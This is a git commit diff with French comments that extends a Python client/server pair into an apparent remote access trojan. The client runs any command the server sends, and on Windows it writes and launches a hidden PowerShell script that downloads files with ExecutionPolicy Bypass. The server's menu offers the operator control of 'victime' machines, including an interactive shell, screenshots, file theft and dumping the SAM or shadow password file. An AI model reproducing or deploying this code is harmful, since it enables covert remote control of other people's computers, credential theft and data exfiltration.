725003f6ada94e37e47bb51ff9b0694c88eebc5e
Mariam <musaibamaiga@gmail.com>
2023-12-29 12:59:38 -0500

    mise à jour serv and client

--- Client/client.py
+++ Client/client.py
@@ -1,18 +1,43 @@
 #client.py
 import socket
 import os
+import platform
+import subprocess
+import sys
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 server = "192.168.1.16"
 port = 12345
 
-print ("Established connection to :", server ":", port)
+print ("Established connection to :", server, ":", port)
 
-client.connect(server, port))
+client.connect((server, port))
 
-while True:
-    data = client.recv(1024)
-    print("Executed : ", data.decode())
-    os.system('cmd /k' + data.decode)
+try: 
+     
+
+    while True:
+        command = client.recv(1024).decode()
+
+        if command.startswith('upload'):
+            if platform.system().lower()=="windows":
+                
+                os.system('echo ([Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12) > %USERPROFILE%\\up.ps1 & echo (New-Object System.Net.WebClient).DownloadFile(\'forwarding/' + command.lstrip('upload ') + '\',' + '$home+' + '\'' + '\\' + command.lstrip('upload ') + '\')  >> %USERPROFILE%\\up.ps1 & start /b /min powershell -ExecutionPolicy ByPass -windowstyle hidden -File %USERPROFILE%\\up.ps1')
+                cmd_output = subprocess.check_output("echo Done! Uploaded to & echo %USERPROFILE%\\"+ command.lstrip('upload '), shell=True)
+        elif command.startswith("exit"):
+            sys.exit()
+           
+        else:
+            cmd_output = subprocess.check_output(command+" & echo Done!", shell=True)
+            client.send(cmd_output)
+            
+    
+finally:
+    client.close()
+
+
+    
+    #print("Executed : ", data.decode())
+    #os.system('cmd /k' + data.decode()).system('cmd /k' + data.decode())
     
--- Server/admin-server.py
+++ Server/admin-server.py
@@ -1,6 +1,7 @@
 #Admin_Server_Script.py
 
 import socket 
+import sys
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # AF.Inet pour les IPs , SOCK_TREAM pour une conn TCP 
 
@@ -14,15 +15,44 @@ while True:
     print("Server listening ...")
     conn, addr = s.accept()
     print("Connection OK :", addr)
+    print("Tap 'help' for commands")
     
     try:
         
         while True:
-           # type_fichier = input("Spécifiez le type de fichier à récupérer (par exemple, .pdf) : ")
-            #commande = f"recupere {type_fichier}"
-            command = input("Command: ")
-            conn.sendall(command.encode())
-            
-    except:
-         print("Disconned from: ", addr)
+          try:
+             command= input("Enter command : ").strip('\n')
+             
+             if command == 'exit':
+             
+                conn.send('exit' .encode())
+                print('Exiting...')
+                conn.close()
+                sys.exit(0)
+              
+             elif command == 'help':
+                print('[*] Commands Available:\n')
+                print('[+] récupération de fichiers du serveur vers la victime : upload ')
+                print('[+] récupération de fichiers de la victime vers le serveur: download /path/to/file')
+                print('[+] prendre une capture d écran de la machine victime: screenshot')
+                print('[+] ouvrir un shell (bash ou cmd) interactif: shell')
+                print('[+] obtenir la configuration réseau de la machine victime: ipconfig')
+                print('[+] rechercher un fichier sur la machine victime: search')
+                print('[+] récupérer la base SAM ou le fichier shadow de la machine: hashdump')
+                print('[+] Exit: exit')
+             else:
+             	conn.send(command.encode())
+             	result = conn.recv(4096).decode().strip('\n')
+             	print(result)
+ 
+          except Exception as e :
+            print("Error:", str(e))
+            print("Disconnected from: ", addr)
+            break        
+         
+
+
+    finally:
+        conn.close()          
+
        
